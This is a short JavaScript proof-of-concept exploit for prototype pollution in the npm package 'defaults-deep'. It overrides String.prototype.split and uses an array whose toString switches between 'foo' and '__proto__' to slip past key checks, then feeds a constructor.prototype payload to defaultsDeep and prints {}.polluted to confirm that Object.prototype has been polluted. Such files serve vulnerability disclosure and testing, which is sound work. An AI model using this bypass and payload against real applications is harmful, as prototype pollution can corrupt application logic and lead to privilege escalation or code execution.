var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
const defaultsDeep = require('defaults-deep');
let obj = {};
console.log({}.polluted);
let payload = JSON.parse('{"constructor": {"prototype": {"polluted": "yes"}}}');
defaultsDeep({}, payload);
console.log({}.polluted);